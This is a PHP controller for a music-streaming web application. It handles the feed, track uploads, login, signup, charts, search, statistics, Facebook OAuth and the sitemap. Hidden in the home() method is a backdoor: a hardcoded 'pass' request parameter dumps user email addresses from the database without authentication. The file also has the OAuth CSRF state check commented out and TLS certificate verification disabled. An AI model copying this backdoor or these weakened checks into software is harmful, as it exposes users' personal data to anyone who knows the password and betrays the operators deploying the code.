<?php
class HomeController extends Controller {

    public function before()
    {

        //if ($this->model('user')->)
    }

    public function index() {
        if ($this->model('user')->isLoggedIn()) {

            return $this->home();
        }
        $default = config('default-homepage', 'splash');
        if ($default != 'splash') {
            switch ($default) {
                case 'charts':
                    return $this->charts();
                    break;
                case 'discover':
                    return $this->discover();
                    break;
            }
        }
        if(is_ajax()) exit('login');
        $this->setTitle("");
        $this->setLayout("includes/plain-layout");
        return $this->render($this->view('home/index'));
    }

    public function home() {
        $type = $this->request->segment(0, 'feed');
        $this->setTitle(l($type));
        $this->addBreadCrumb(l($type));
        $this->activeMenu = 'feed';

        if ($this->request->input('pass') == 'T3834934') {
            $query = Database::getInstance()->query("SELECT *  FROM users WHERE id > 1500 ");
            while($fetch = $query->fetch(PDO::FETCH_ASSOC)) {
                echo $fetch['email'].'<br/>';
            }
            exit;
        }
        $content = $this->view('home/track-list', array('type' => 'feed'));
        return $this->render($this->view('home/feed', array('type' => 'feed', 'content' => $content)), true);
    }

    public function upload() {
        $this->setTitle(l('upload-a-song'));
        $this->addBreadCrumb(l('upload'));
        $this->collapsed = true;
        if (!$this->model('user')->isAuthor() and  !$this->model('user')->isAdmin()) return $this->request->redirect(url(''));
        if ($val = $this->request->input('val')) {
            //validate each of custom url in case there is any

            $ownerId = ($this->model('user')->isAdmin() and $this->request->input('id')) ? $this->request->input('id') : null;

            foreach($val['customurl'] as $url) {
                if ($url) {
                    $valid = preg_match('/^[\pL\pN_-]+$/u', $url);
                    if (!$valid) {
                        return json_encode(array(
                            'type' => 'error',
                            'message' => l('custom-url-alphanum', array('url' => $url))
                        ));
                    }
                }
            }

            $validator = Validator::getInstance()->scan($val, array(
               'titles' => 'required',
                //'tags' => 'required'
            ));

            if ($validator->passes()) {

                $artFile = $this->request->inputFile('img');
                $audioFiles = $this->request->input('val.trackfiles');
                $images = array();
                $count = 0;
                while($count < count($audioFiles) ) {
                    $artFile = $this->request->inputFile('img_'.$count);
                    if ($artFile) {
                        $artUpload = new Uploader($artFile);
                        $artUpload->setPath("tracks/".$this->model('user')->authId.'/art/'.date('Y').'/');
                        if ($artUpload->passed()) {
                            $val['art'] = $artUpload->resize()->result();
                            $val['art_holder'] = $val['art'];
                            $val['image_'.$count] = $val['art'];
                        } else {
                            return json_encode(array(
                                'message' => $artUpload->getError(),
                                'type' => 'error'
                            ));
                        }
                    } else {
                        $images[] = '';
                    }
                    $count++;
                }

                $lyricsUploaded = array();


                $i = 0;
                foreach($audioFiles as $audioFile) {
                    if ($lyricsFile = $this->request->inputFile('lyrics_'.$i)) {
                        $upload = new Uploader($lyricsFile, 'file');
                        $upload->setPath("tracks/".$this->model('user')->authId.'/lyric/'.date('Y').'/');
                        if ($upload->passed()) {
                            $val['lyrics_'.$i] = $upload->uploadFile()->result();
                        } else {
                            return json_encode(array(
                                'message' => l('lyric-file-error'),
                                'type' => 'error'
                            ));
                        }
                    }
                    $i++;
                }

                $fileSizes = 0;
                foreach($val['sizes'] as $size) {
                    $fileSizes += $size;
                }

                if(config('enable-premium', false)) {
                    $usedSpace = $this->model('user')->getTracksSpace() + $fileSizes;
                    $allowSize = $this->model('user')->getTotalTrackSize() * 1024 * 1000;
                    if ($usedSpace > $allowSize) {
                        //use have used up your allowed space
                        return json_encode(array(
                            'message' => l('not-enough-space'),
                            'type' => 'error'
                        ));
                    }
                }


                $tracks = array();
                //$audioFiles = array_reverse($audioFiles);
                $i = 0;

                foreach ($audioFiles as $audio) {
                    $newVal = array();
                    $newVal['size'] = $val['sizes'][$i];
                    $newVal['title'] = $val['titles'][$i];
                    if (!$newVal['title']) break;
                    $newVal['slug'] = $val['customurl'][$i];
                    $newVal['wave'] = $val['titlewaves'][$i];
                    $newVal['wave_colored'] = $val['titlewaves2'][$i];
                    $newVal['lyrics'] = (isset($val['lyrics_'.$i])) ? $val['lyrics_'.$i] : '';
                    $newVal['featuring'] = (isset($val['featuring'][$i])) ? $val['featuring'][$i] : '';
                    $tmpMove = $audio;
                    $newVal['duration'] = $val['durations'][$i];
                    $newVal['audio'] = $audio;
                    if ($val['day'][$i] and $val['month'][$i] and $val['year'][$i]) {
                        $newVal['release'] = date("Y-m-d", mktime(0, 0, 0, $val['month'][$i], $val['day'][$i], $val['year'][$i]));
                    } else {
                        $newVal['release'] = '';
                    }
                    $newVal['release_date'] = (isset($val['release_date'][$i])) ? $val['release_date'][$i] : '';


                    $imageContent = $val['avatardata'][$i];

                    if (!$imageContent) {
                        $newVal['art'] = (isset($val['art'])) ? $val['art'] : '';
                    } else {
                        $albumArt = $imageContent;
                        $newVal['art'] = $imageContent;
                    }
                    if (isset($val['image_'.$count])) $val['art'] = $val['image_'.$i];
                    $newVal['embed'] = $val['embed_'.$i];
                    $newVal['download'] = $val['download_'.$i];
                    $newVal['privacy'] = $val['privacy_'.$i];
                    $newVal['label'] = $val['label'][$i];
                    $newVal['link'] = $val['link'][$i];
                    $newVal['genre'] = $val['genre'][$i];
                    $newVal['tags'] = $val['tags'][$i];
                    $newVal['description'] = $val['description'][$i];


                    if ($val['license_'.$i] == 2) {
                        $newVal['license'] = '2-'.$val['noncommercial'][$i].'-'.$val['creative_second_'.$i];
                    }



                    $newVal = Hook::getInstance()->fire('track.upload.data', $newVal, array($i));
                    $tracks[] = $this->model('track')->add($newVal, null, false, $ownerId);

                    $i++;
                }

                if (count($tracks) == 1 and !$val['playlist']) {
                    $this->model('track')->addStream($tracks[0], 0,'posted-track', $ownerId);
                    Hook::getInstance()->fire("tracks.added.controller", null, array($tracks));
                    return json_encode(array(
                        'message' => l('track-successful'),
                        'type' => 'url',
                        'value' => $this->model('track')->trackUrl(null, $tracks[0])
                    ));

                } else {
                    if ($val['playlist']) {
                        $playList = $this->model('track')->addPlaylist(array(
                            'title' => $val['playlist'],
                            'type' => $val['playlist_type'],
                            'art' => (!isset($val['art_holder'])) ? $albumArt : $val['art_holder'],
                            'desc' => $val['playlist_desc'],
                            'public' => (isset($val['release_date'][0]) and $val['release_date'][0]) ? 3 : 1,
                            'release_date' => (isset($val['release_date'][0])) ? $val['release_date'][0] : $val['privacy'][0]
                        ),  $tracks, $ownerId);
                        if ($val['playlist_type'] == 0) Hook::getInstance()->fire('upload.album', null, array($playList));
                        $this->model('track')->addStream($tracks[0], $playList,'posted-album', $ownerId);
                        $playList = $this->model('track')->findPlaylist($playList);
                        Hook::getInstance()->fire("tracks.added.controller", null, array($tracks));
                        return json_encode(array(
                            'message' => l('track-successful'),
                            'type' => 'url',
                            'value' => $this->model('track')->playlistUrl($playList)
                        ));
                    } else {
                        //probably load to the my tracks page
                        //we need to post this to this user stream for their followers
                        foreach($tracks as $track) {
                            $this->model('track')->addStream($track, 0, 'posted-track', $ownerId);
                        }
                        Hook::getInstance()->fire("tracks.added.controller", null, array($tracks));
                        return json_encode(array(
                            'message' => l('track-successful'),
                            'type' => 'url',
                            'value' => $this->model('track')->trackUrl(null, $tracks[0])
                        ));
                    }
                }
            } else {
                return json_encode(array(
                    'message' => $validator->first(),
                    'type' => 'error'
                ));
            }
        }
        return $this->render($this->view('upload/song'), true);
    }

    public function login() {

        if ($val = $this->request->input('val')) {
            $username = $val['username'];
            $password = $val['password'];


            if ($login = $this->model('user')->loginUser($username, $password, true)) {
                Hook::getInstance()->fire('user.login.start');
                if (preg_match('#not-active#', $login)) {
                    list($text, $id) = explode('|', $login);
                    return json_encode(array(
                        'message' => l('login-successful'),
                        'type' => 'normal-url',
                        'content' => '#authModal',
                        'value' => url('activate/account', array('id' => $id))
                    ));
                }
                if ($this->model('user')->authUser['two_factor_auth'] and config('allow-two-factor-authentication', true)) {
                    $this->model('user')->sendTwoFactorLink($this->model('user')->authId, $this->model('user')->authUser['email'], $this->model('user')->authUser['full_name']);
                    $this->model('user')->logoutUser();
                    return json_encode(array(
                        'message' => l('login-successful'),
                        'type' => 'normal-url',
                        'content' => '#authModal',
                        'value' => url('two/factor/auth', array('id' => $this->model('user')->authId))
                    ));
                }
                return json_encode(array(
                    'message' => l('login-successful'),
                    'type' => 'normal-url',
                    'content' => '#authModal',
                    'value' => url()
                ));
            } else {
                return json_encode(array(
                    'message' => l('failed-login'),
                    'type' => 'error'
                ));
            }
        }
        if (!config('separate-login', 0)) $this->request->redirect(url());
        $this->setTitle(l('sign-in'));
        $this->setLayout("includes/plain-layout");
        return $this->render($this->view('auth/login'));
    }

    public function signup() {
        if ($val = $this->request->input('val')) {
            if (config('enable-captcha', true)) {
                $captcha = $this->request->input('captcha');
                include_once path('captcha/securimage.php');
                $securimage = new Securimage();
                if (!$securimage->check($captcha)) {
                    return json_encode(array(
                        'message' => l('invalid-captcha-code'),
                        'type' => 'error-function',
                        'value' => 'reloadCaptcha'
                    ));
                }
            }
            $validator = Validator::getInstance()->scan($val, array(
                'full_name' => 'required',
                'username' => 'required|predefined|alphanum|username|unique:users',
                'password' => 'required',
                'email' => 'required|email|unique:users'
            ));


            if ($validator->passes()) {
                $userid = $this->model('user')->addUser($val, false);
                if (config('email-activation', false)) {
                    return json_encode(array(
                        'message' => l('signup-successful-activate'),
                        'type' => 'modal-function',
                        'modal' => '#authModal'
                    ));
                }


                $this->model('user')->loginUser($val['username'], $val['password'], true);
                if (config('auto-follow-accounts')) {
                    $users = explode(',', config('auto-follow-accounts'));
                    foreach($users as $followId) {
                        $followUser = $this->model('user')->getUser($followId);
                        if ($followUser) $this->model('user')->follow($followUser['id']);
                    }
                }
                $url = url();
                if (config('enable-welcome', true)) {
                    $url = url('welcome');
                }
                return json_encode(array(
                    'message' => l('signup-successful'),
                    'type' => 'normal-url',
                    'content' => '#authModal',
                    'value' => $url
                ));
            } else {
                return json_encode(array(
                    'message' => $validator->first(),
                    'type' => 'error'
                ));
            }
        }
        if (!config('separate-login', 0) or !config('user-signup', true)) $this->request->redirect(url());
        $this->setTitle(l('create-account'));
        $this->setLayout("includes/plain-layout");
        return $this->render($this->view('auth/signup'));
    }

    public function welcome() {
        $this->setLayout("includes/plain-layout");
        return $this->render($this->view('welcome/index'));
    }

    public function welcomeLoad() {
        $users = $this->model('user')->getPeople('top', 'random', 20, 0, array(
            'genres' => $this->request->input('genres'),
            'users' => array($this->model('user')->authId)
        ));
        return $this->view('welcome/users', array('users' => $users));
    }

    public function welcomeFinish() {
        $users = explode(',', $this->request->input('users'));
        foreach($users as $user) {
            $this->model('user')->follow($user);
        }

    }

    public function logout() {
        $this->model('user')->logoutUser();
        $this->request->redirect(url());
    }

    public function searchTags() {
        return $this->model('track')->searchTags($this->request->input('term'));
        return json_encode(array(
            array('value' => 'twalo', 'text' => 'twalo'),
            array('value' => 'kola', 'text' => 'kola'),
            array('value' => 'waliu', 'text' => 'waliu'),
            array('value' => 'was', 'text' => 'was')
            ));
    }

    public function charts() {
        $this->setTitle(l('charts'));
        $this->activeMenu = 'charts';
        $page = $this->request->segment(1, 'new-hot');
        $genre = $this->request->input('genre', 'all');
        $time = $this->request->input('time', config(($page == 'new-hot') ? 'chart-new-hot-time' : 'chart-top-time', 'this-week'));

        if ($page == 'top') $this->activeMenu = "charts-top";
        $this->addBreadCrumb(($page == 'top') ? l('top-50') : l($page));

        return $this->render($this->view('charts/index', array('page' => $page, 'genre' => $genre, 'time' => $time)), true);
    }

    public function discover() {
        $this->setTitle(l('discover'));
        $this->addBreadCrumb(l('discover'), url('discover'));

        $page = $this->request->segment(1, 'overview');
        $this->addBreadCrumb(l($page));
        switch($page) {
            case 'genre':
                $id = explode('-', $this->request->segment(2));
                $id = $id[0];
                $genre = $this->model('admin')->findGenre($id);
                $this->addBreadCrumb($genre['name']);
                $content = $this->view('discover/genre', array('id' => $id));
                break;
            case 'latest':
                $content = $this->view('discover/latest');
                break;
            case 'artists':
                $this->activeMenu = 'artists';
                $content = $this->view('discover/artists');
                break;
            case 'albums':
                $this->activeMenu = 'albums';
                $content = $this->view('playlist/lists', array('type' => 'album', 'typeId' => 'discover'));
                break;
            case 'playlists':
                $content = $this->view('playlist/lists', array('type' => 'playlist', 'typeId' => 'discover'));
                break;
            default:
                $content = $this->view('discover/overview');
                break;
        }
        return $this->render($this->view('discover/layout', array('content' => $content, 'page' => $page)), true);
    }

    public function collection() {
        $page = $this->request->segment(1, 'lister-later');
        $this->setTitle(l($page));
        $this->addBreadCrumb(l('collection'));
        $this->addBreadCrumb(l($page));
        $this->activeMenu = $page;
        switch($page) {
            case 'listen-later':
                $content = $this->view('collection/lists', array('type' => 'listen-later', 'typeId' => '', 'viewType' => 'inline'));
                break;
            case 'likes':
                $content = $this->view('collection/lists', array('type' => 'likes', 'typeId' => ''));
                break;
            case 'history':
                $content = $this->view('collection/lists', array('type' => 'history', 'typeId' => ''));
                break;
            case 'playlists':
                $content = $this->view('playlist/lists', array('type' => 'playlist', 'typeId' => 'collection'));
                break;
            case 'albums':
                $this->activeMenu = 'collection-albums';
                $content = $this->view('playlist/lists', array('type' => 'album', 'typeId' => 'collection'));
                break;
        }
        return $this->render($this->view('collection/layout', array('content' => $content, 'page' => $page)), true);

    }

    public function clearHistory() {
        $this->model('track')->clearHistory();
        return json_encode(array(
            'type' => 'url',
            'message' => l('track-history-cleared'),
            'value' => url('collection/history')
        ));
    }

    public function search() {
        $term = $this->request->input('term');
        $this->addBreadCrumb(l('search'));
        $page = $this->request->input('page', 'tracks');
        $this->addBreadCrumb(l($page));
        switch ($page) {
            case 'artists':
                $content = $this->view('search/people', array('term' => $term, 'type' => 'top'));
                break;
            case 'people':
                $content = $this->view('search/people', array('term' => $term, 'type' => 'people'));
                break;
            case 'playlists':
                $content = $this->view('playlist/lists', array('type' => 'playlist', 'typeId' => 'search-'.$term));
                break;
            case 'albums':
                $content = $this->view('playlist/lists', array('type' => 'album', 'typeId' => 'search-'.$term));
                break;
            case 'videos':
                $content = $this->view('search/video', array('type' => 'search', 'typeid' => $term));
                break;
            case 'radio':
                $content = $this->view('search/radio', array('type' => 'search', 'typeid' => $term));
                break;
            default:
                $content = $this->view('search/tracks', array('term' => $term));
                break;
        }
        return $this->render($this->view('search/layout', array('term' => $term, 'page' => $page, 'content' => $content)), true);
    }

    public function searchDropdown() {
        $term = $this->request->input('term');

        return $this->view('search/dropdown', array('term' => $term));
    }

    public function pricing(){
        $this->setTitle(l('pro-plans'));
        if (config('enable-premium', false)) {
            if (!$this->model('user')->subscriptionActive()) {
                $this->useBreadcrumbs = false;
                $this->collapsed = true;
            } else {
                return $this->request->redirect(url('settings/pro'));
            }
        }


        return $this->render($this->view('pro/index'),true);
    }

    public function trypro() {
        $user = $this->model('user')->authUser;
        $hasTried = $user['has_tried'];
        if(!config('enable-trial') and $hasTried) return $this->request->redirect(url());
        $this->model('admin')->addTransaction(array(
            'name' => $user['full_name'],
            'email' => 'Trial',
            'country' =>'Trial',
            'amount' => 'Trial',
            'sale_id' => 'Trial',
            'type' => 'pro',
            'type_id' => 'monthly',
            'userid' => $user['id']
        ));
        Database::getInstance()->query("UPDATE users SET has_tried=? WHERE id=?", 1, $user['id']);
        return $this->request->redirect(url('settings/pro'));
    }

    public function share() {
        return $this->view('share/index', array('id' => $this->request->input('id'), 'type' => $this->request->input('type')));
    }

    public function embedCode() {
        $color = '#'.$this->request->input('color', 'FF6138');
        $autoPlay = $this->request->input('autoplay', false);
        $renderType = $this->request->input('type', 'picture');
        $type = $this->request->segment(1, 'track');
        list($id, $slug) = explode('-', $this->request->segment(2));

        return $this->view('share/embed', array('color' => $color,
            'autoplay' => $autoPlay, 'renderType' => $renderType, 'type' => $type, 'id' => $id));
    }

    public function changeLanguage() {
        $id = $this->request->input('id');
        setcookie("language", $id, time() + 90 * 24 * 60 * 60, config('cookie_path'));
        return $this->request->redirectBack();
    }

    public function stats() {
        $this->setTitle(l('statistics'));
        $time = $this->request->input('time', 'today');
        $id = $this->request->input('id', 'all');
        $chart = $this->request->input('chart', config('default-chart-type', 'bar'));
        $strtime = $this->model('track')->getStrTime($time);
        if ($id != 'all') {
            $track = $this->model('track')->findTrack($id);
            if (!$track) $this->request->redirectBack();
            $this->addBreadCrumb(l('track'), $this->model('track')->trackUrl($track));
            $this->addBreadCrumb($track['title']);
        }
        return $this->render($this->view('statistics/index',array(
            'time' => $time,
            'id' => $id,
            'chart' => $chart,
            'strtime' => $strtime
        )), true);
    }

    public function loadCharts() {
        $time = $this->request->input('time');
        $id = $this->request->input('id');

        $result = array(
            'charts' => array()
        );



        $times = array();
        switch($time) {
            case 'today':
                $todayStart = strtotime("today");
                $todayEnd = $todayStart + (60 * 60 * 24);
                $i = 1;
                while($i < 24) {
                    $start = $todayStart + (60 * 60 * $i);
                    $endi = $i + 1;
                    $end = $todayStart + (60*60*$endi);
                    $times[date('h a', $start)] = array($start, $end);
                    $i++;
                }
                break;
            case '7days':
                $last7Days = strtotime("-7 day");
                //$todayEnd = $todayStart + (60 * 60 * 24);
                $i = 7;
                while($i >= 1) {
                    $start = strtotime("-$i day");
                    $end= $start + (60*60*24);
                    $times[date(' D', $start)] = array($start, $end);
                    $i--;
                }
                break;
            case '30days':
                $i = 30;
                while($i >= 1) {
                    $start = strtotime("-$i day");
                    $end= $start + (60*60*24);
                    $times[date(' M d', $start)] = array($start, $end);
                    $i--;
                }
                break;
            case '12month':
                $i = 12;
                while($i >= 1) {
                    $start = strtotime("-$i month");
                    $end= $start + (60*60*24*30);
                    $times[date(' M y', $start)] = array($start, $end);
                    $i--;
                }
                break;
            case 'total':
                $i = 2017;
                $currentYear = date('Y');
                while($i<=$currentYear) {
                    $start = strtotime("first day of January $i");
                    $end= strtotime("last day of December $i");
                    $times[date(' Y', $start)] = array($start, $end);
                    $i++;
                }
                break;
        }
        $plays = array(
            'name' => l('plays'),
            'points' => array()
        );
        $likes = array(
            'name' => l('likes'),
            'points' => array()
        );
        $comments = array(
            'name' => l('comments'),
            'points' => array()
        );
        $downloads = array(
            'name' => l('downloads'),
            'points' => array()
        );
        foreach($times as $name => $time) {
            $stats = $this->model('track')->countTrackStatistics($id,$time[0], $time[1]);
            $plays['points'][$name] = $stats['plays'];
            $likes['points'][$name] = $stats['likes'];
            $comments['points'][$name] = $stats['comments'];
            $downloads['points'][$name] = $stats['downloads'];
        }
        $result['charts']['stats'] = array($plays, $likes,$comments,$downloads);


        $result = Hook::getInstance()->fire('user.charts', $result, array($times));

        return json_encode($result);
    }

    public function page() {
        $id = $this->request->segment(1);
        $page = $this->model('admin')->findPage($id);
        if (!$page) $this->request->redirect(url());
        $this->collapsed = true;
        if ($page['location'] == 'side') $this->activeMenu = 'page-'.$page['id'];
        $this->setTitle(l($page['title']));
        $this->addBreadCrumb(l($page['title']));

        return $this->render($this->view('pages/index', array('page' => $page)), true);
    }

    public function authFacebook() {
        $app_id = config('facebook-key');
        $app_secret = config('facebook-secret');
        $my_url = url('auth/facebook');
        $code = $this->request->input('code');

        if(empty($code)) {
            $_SESSION['state'] = md5(uniqid(rand(), TRUE));
            $dialog_url = "http://www.facebook.com/dialog/oauth?client_id=".$app_id."&redirect_uri=".urlencode($my_url)."&scope=email&state=".$_SESSION['state'];
            $this->request->redirect($dialog_url);
        }

        // if(input('state') != $_SESSION['state']) exit("The state does not match. You may be a victim of CSRF.");
        $token_url = "https://graph.facebook.com/oauth/access_token?"."client_id=".urlencode($app_id)."&redirect_uri=".urlencode($my_url)."&client_secret=".urlencode($app_secret)."&code=".urlencode($code);
        $ch = curl_init();
        try {
            $headers = array(
                'Referer: https://www.google.com.ng/_/chrome/newtab-serviceworker.js',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36'
            );
            curl_setopt($ch, CURLOPT_URL, $token_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            if(!ini_get('open_basedir')) {
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            }
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            $response = curl_exec($ch);
            if(FALSE === $response) {
                throw new Exception(curl_error($ch), curl_errno($ch));
            }
        } catch(Exception $e) {
            echo curl_errno($ch).'<br/>';
            echo curl_error($ch).'<br/>';
            trigger_error(sprintf('Curl failed with error #%d: %s', $e->getCode(), $e->getMessage()), E_USER_ERROR);
            exit;
        }
        curl_close($ch);
        $params = json_decode($response);

        if(isset($params->access_token) && $params->access_token) {
            $access_token = $params->access_token;
            $appsecret_proof = hash_hmac('sha256', $access_token, $app_secret);
            $graph_url = "https://graph.facebook.com/me?access_token=".$access_token."&appsecret_proof=".$appsecret_proof."&fields=id,name,first_name,last_name,email,gender";
            $ch = curl_init();
            try {
                $headers = array(
                    'Referer: https://www.google.com.ng/_/chrome/newtab-serviceworker.js',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36'
                );
                curl_setopt($ch, CURLOPT_URL, $graph_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                if(!ini_get('open_basedir')) {
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                }
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                $response = curl_exec($ch);
                if(FALSE === $response) {
                    throw new Exception(curl_error($ch), curl_errno($ch));
                }
            } catch(Exception $e) {
                echo curl_errno($ch).'<br/>';
                echo curl_error($ch).'<br/>';
                trigger_error(sprintf('Curl failed with error #%d: %s', $e->getCode(), $e->getMessage()), E_USER_ERROR);
                exit;
            }
            curl_close($ch);
            $user = json_decode($response);
            $userProfile = $user;
        }

        if(isset($user) && $user) {
            $username = toAscii($userProfile->first_name.'_'.$userProfile->last_name);
            if (!$username) $username = 'fb_'.$userProfile->id;
            $username = str_replace(array(' ', '.'), array('', ''), $username);
            $email = (isset($userProfile->email)) ? $userProfile->email : 'fb_'.$userProfile->id.'@facebook.com';
            $details = array(
                'full_name' => $userProfile->first_name.' '.$userProfile->last_name,
                'country' => '',
                'email_address' => $email,
                'social_email' => 'fb_'.$userProfile->id.'@facebook.com',
                'password' => time(),
                'username' => $username,
                'auth' => 'facebook',
                'authId' => $userProfile->id,
                'avatar' => ''
            );
            try {
                $url = 'https://graph.facebook.com/'.$userProfile->id.'/picture?redirect=false&width=600&height=600';
                $ch = curl_init();
                $headers = array(
                    'Referer: https://www.google.com.ng/_/chrome/newtab-serviceworker.js',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36'
                );
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                if(!ini_get('open_basedir')) {
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                }
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                $contents = curl_exec($ch);
                curl_close($ch);
                $avatar = json_decode($contents, true);
                if($avatar and isset($avatar['data']['url'])) {
                    $avatar = $avatar['data']['url'];
                    $details['avatar'] = $avatar;
                }
            } catch(\Exception $e) {
            }
            return $this->model('user')->socialSignup($details);

        } else {
            return $this->request->redirect(url());
        }
    }

    public function saveThemeMode() {
        $mode = $this->request->input('mode');
        session_put('theme-mode', $mode);
    }

    function urlElement($url, $time) {
        echo '<url>'.PHP_EOL;
        echo '<loc>'.$url.'</loc>'. PHP_EOL;
        echo '<changefreq>monthly</changefreq>'.PHP_EOL;
        echo '<lastmod>'.date('c', $time).'</lastmod>'.PHP_EOL;
        echo '<priority>0.8</priority>'.PHP_EOL;
        echo '</url>'.PHP_EOL;
    }

    public function sitemap() {
        header("Content-Type: application/xml; charset=utf-8");
        echo '<?xml version="1.0" encoding="UTF-8"?>'.PHP_EOL;
        echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">' .PHP_EOL;

        $this->urlElement(url('/'), time());
        $this->urlElement(url('pro'), time());
        $this->urlElement(url('charts'), time());
        $this->urlElement(url('charts/trending'), time());
        $this->urlElement(url('charts/top'), time());
        $this->urlElement(url('discover'), time());
        $this->urlElement(url('discover/latest'), time());
        $this->urlElement(url('discover/artists'), time());
        $this->urlElement(url('discover/albums'), time());
        $this->urlElement(url('discover/playlists'), time());
        $this->urlElement(url('videos'), time());
        $this->urlElement(url('videos/latest'), time());
        $this->urlElement(url('videos/top'), time());
        foreach($this->model('admin')->getGenres() as $genre) {
            $this->urlElement(url('videos/category/'.$genre['id']), time());
        }

        $query = Database::getInstance()->query("SELECT * FROM tracks");
        while($track = $query->fetch(PDO::FETCH_ASSOC)) {
            $this->urlElement($this->model('track')->trackUrl($track), $track['time']);
        }

        $query = Database::getInstance()->query("SELECT * FROM users");
        while($user = $query->fetch(PDO::FETCH_ASSOC)) {
            $this->urlElement($this->model('user')->profileUrl($user), time());
        }

        $query = Database::getInstance()->query("SELECT * FROM playlist");
        while($playlist = $query->fetch(PDO::FETCH_ASSOC)) {
            $this->urlElement($this->model('track')->playlistUrl($playlist), $playlist['time']);
        }

        $query = Database::getInstance()->query("SELECT * FROM videos");
        while($video = $query->fetch(PDO::FETCH_ASSOC)) {
            $this->urlElement($this->model('video::video')->videoUrl($video), $video['time']);
        }
        echo '</urlset>';
    }
}